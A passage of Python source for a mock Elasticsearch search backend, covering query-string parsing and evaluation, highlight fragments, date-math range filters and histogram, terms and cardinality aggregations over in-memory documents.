                self.i += 1
                nodes.append(self._unary())
            elif self.default_and and k in ("TERM", "NOT", "LP"):
                nodes.append(self._unary())
            else:
                break
        return nodes[0] if len(nodes) == 1 else ("and", nodes)

    def _unary(self):
        k = self._kind()
        if k == "NOT":
            self.i += 1
            return ("not", self._unary())
        if k == "LP":
            self.i += 1
            node = self._or()
            if self._kind() != "RP":
                raise QueryParseError("Missing closing parenthesis")
            self.i += 1
            return node
        if k == "TERM":
            raw = self.t[self.i][1]
            self.i += 1
            return ("term", *_compile_term(raw))
        raise QueryParseError(f"Expected a search term but found {k or 'end of query'}")


def _merge(into: dict, other: dict) -> None:
    for f, vals in other.items():
        slot = into.setdefault(f, {})
        for v, spans in vals.items():
            slot.setdefault(v, []).extend(spans)


def _eval(node, flat: dict, scope):
    kind = node[0]
    if kind == "all":
        return True, {}
    if kind == "term":
        field, rx = node[1], node[2]
        if field:
            keys = [k for k in flat if fnmatch.fnmatchcase(k, field)]
        else:
            keys = [k for k in flat if scope is None or any(fnmatch.fnmatchcase(k, f) for f in scope)]
        if rx is None:
            return bool(keys), {}
        hl = {}
        for k in keys:
            for v in flat[k]:
                spans = [m.span() for m in rx.finditer(v) if m.end() > m.start()]
                if spans:
                    hl.setdefault(k, {}).setdefault(v, []).extend(spans)
        return bool(hl), hl
    if kind == "not":
        ok, _ = _eval(node[1], flat, scope)
        return not ok, {}
    hl, any_ok = {}, False
    for child in node[1]:
        ok, h = _eval(child, flat, scope)
        if kind == "and" and not ok:
            return False, {}
        if ok:
            any_ok = True
            _merge(hl, h)
    return (True if kind == "and" else any_ok), hl


def _fragments(value: str, spans, size: int, maxn: int, pre: str, post: str) -> list[str]:
    merged = []
    for a, b in sorted(set(spans)):
        if merged and a <= merged[-1][1]:
            merged[-1] = (merged[-1][0], max(b, merged[-1][1]))
        else:
            merged.append((a, b))
    frags, i = [], 0
    while i < len(merged) and len(frags) < maxn:
        start = max(0, merged[i][0] - size // 3)
        end = min(len(value), start + size)
        start = max(0, end - size) if end - start < size else start
        if merged[i][1] > end:
            end = merged[i][1]
        out, cur = [], start
        while i < len(merged) and merged[i][1] <= end:
            a, b = merged[i]
            a = max(a, cur)
            out.append(html.escape(value[cur:a]) + pre + html.escape(value[a:b]) + post)
            cur, i = b, i + 1
        out.append(html.escape(value[cur:end]))
        frags.append(("…" if start > 0 else "") + "".join(out) + ("…" if end < len(value) else ""))
    return frags


# =========================================================================== #
# Request handling: filters, aggs, response shape
# =========================================================================== #
_NOW_RE = re.compile(r"^now(?:([+-])(\d+)([smhdw]))?(?:/[smhdwMy])?$")
_UNIT = {"s": 1, "m": 60, "h": 3600, "d": 86400, "w": 604800}


def _resolve_date(v) -> datetime:
    if isinstance(v, datetime):
        return v if v.tzinfo else v.replace(tzinfo=timezone.utc)
    if isinstance(v, (int, float)):
        return datetime.fromtimestamp(v / 1000, timezone.utc)
    m = _NOW_RE.match(str(v).strip())
    if m:
        if not m.group(1):
            return NOW
        delta = timedelta(seconds=int(m.group(2)) * _UNIT[m.group(3)])
        return NOW - delta if m.group(1) == "-" else NOW + delta
    dt = datetime.fromisoformat(str(v).replace("Z", "+00:00"))
    return dt if dt.tzinfo else dt.replace(tzinfo=timezone.utc)


def _parse_interval(s: str) -> int:
    m = re.fullmatch(r"(\d+)([smhdw])", s)
    if not m:
        raise QueryParseError(f"Unsupported interval {s!r}")
    return int(m.group(1)) * _UNIT[m.group(2)]


def _collect(q, qs_list: list, ranges: list) -> None:
    if not isinstance(q, dict):
        return
    if "query_string" in q:
        qs_list.append(q["query_string"])
    elif "range" in q:
        ranges.append(q["range"])
    elif "bool" in q:
        for clause in ("must", "filter"):
            c = q["bool"].get(clause, [])
            for sub in c if isinstance(c, list) else [c]:
                _collect(sub, qs_list, ranges)


def _in_range(ts: datetime, cond: dict) -> bool:
    for op, val in cond.items():
        if op == "format":
            continue
        bound = _resolve_date(val)
        if (op == "gte" and ts < bound) or (op == "gt" and ts <= bound) or \
           (op == "lte" and ts > bound) or (op == "lt" and ts >= bound):
            return False
    return True


def _values(doc: dict, field: str) -> list[str]:
    return [doc["_index"]] if field == "_index" else doc["_flat"].get(field, [])


def _aggregate(spec: dict, docs: list[dict]) -> dict:
    out = {}
    for name, agg in (spec or {}).items():
        if "date_histogram" in agg:
            cfg = agg["date_histogram"]
            step = _parse_interval(cfg.get("fixed_interval") or cfg.get("interval", "1h")) * 1000
            counts = Counter(int(d["_ts"].timestamp() * 1000) // step * step for d in docs)
            keys = list(counts)
            for edge in ("min", "max"):
                if edge in cfg.get("extended_bounds", {}):
                    keys.append(int(_resolve_date(cfg["extended_bounds"][edge]).timestamp() * 1000) // step * step)
            buckets = []
            if keys:
                lo, hi = min(keys), max(keys)
                if (hi - lo) // step > 5000:
                    raise QueryParseError("Too many histogram buckets — widen the interval")
                buckets = [{"key_as_string": _iso(datetime.fromtimestamp(k / 1000, timezone.utc)), "key": k,
                            "doc_count": counts.get(k, 0)} for k in range(lo, hi + step, step)]
            out[name] = {"buckets": buckets}
        elif "terms" in agg:
            cfg = agg["terms"]
            c = Counter(v for d in docs for v in set(_values(d, cfg["field"])))
            top = c.most_common(cfg.get("size", 10))
            out[name] = {"doc_count_error_upper_bound": 0,
                         "sum_other_doc_count": sum(c.values()) - sum(n for _, n in top),
                         "buckets": [{"key": k, "doc_count": n} for k, n in top]}
        elif "cardinality" in agg:
            out[name] = {"value": len({v for d in docs for v in _values(d, agg["cardinality"]["field"])})}
    return out


def _index_matches(name: str, patterns: list[str]) -> bool:
    bare = name[4:] if name.startswith(".ds-") else name
    return any(fnmatch.fnmatchcase(bare, p) or fnmatch.fnmatchcase(name, p) for p in patterns)


def mock_search(index: str = "*", body: dict | None = None) -> dict:
    """Pretend to be POST /{index}/_search. Same body in, ES-shaped response out."""
    t0 = time.perf_counter()
    body = body or {}
    qs_list, ranges = [], []
    _collect(body.get("query", {"match_all": {}}), qs_list, ranges)

    compiled = []
    for qs in qs_list:
        default_and = str(qs.get("default_operator", "OR")).upper() == "AND"
        node = _Parser(_tokenize(qs.get("query", "*")), default_and).parse()
        scope = qs.get("fields") or (None if qs.get("default_field", "*") == "*" else [qs["default_field"]])
        compiled.append((node, scope))

    patterns = [p.strip() for p in (index or "*").split(",") if p.strip()] or ["*"]
    matched = []
    for d in DOCS:
        if not _index_matches(d["_index"], patterns):
            continue
        if not all(_in_range(d["_ts"], cond) for r in ranges for f, cond in r.items() if f == "@timestamp"):
            continue
        hl_all, ok = {}, True
        for node, scope in compiled:
            hit, hl = _eval(node, d["_flat"], scope)
            if not hit:
                ok = False
                break
            _merge(hl_all, hl)
        if ok:
            matched.append((d, hl_all))

    try:
        order = body["sort"][0]["@timestamp"]["order"]
    except (KeyError, IndexError, TypeError):
        order = "desc"
    matched.sort(key=lambda x: x[0]["_ts"], reverse=(order == "desc"))

    frm, size = int(body.get("from", 0)), int(body.get("size", 10))
    hl_cfg = body.get("highlight")
    hits = []
    for d, hl in matched[frm:frm + size]:
        hit = {"_index": d["_index"], "_id": d["_id"], "_score": None, "_source": d["_source"],
               "sort": [int(d["_ts"].timestamp() * 1000)]}
        if hl_cfg and hl:
            pre, post = hl_cfg.get("pre_tags", ["<em>"])[0], hl_cfg.get("post_tags", ["</em>"])[0]
            size_f, n_f = hl_cfg.get("fragment_size", 100), hl_cfg.get("number_of_fragments", 5)
            hit["highlight"] = {}
            for field, vals in hl.items():
                frags = []
                for value, spans in vals.items():
                    frags += _fragments(value, spans, size_f, n_f, pre, post)
                hit["highlight"][field] = frags[:n_f]
        hits.append(hit)

    docs_only = [d for d, _ in matched]
    return {
        "took": max(1, int((time.perf_counter() - t0) * 1000)),
        "timed_out": False,
        "_shards": {"total": 5, "successful": 5, "skipped": 0, "failed": 0},
        "hits": {"total": {"value": len(matched), "relation": "eq"}, "max_score": None, "hits": hits},
        "aggregations": _aggregate(body.get("aggs") or body.get("aggregations"), docs_only),
    }


if __name__ == "__main__":
    print(f"{len(DOCS)} mock documents, clock frozen at {_iso(NOW)}")
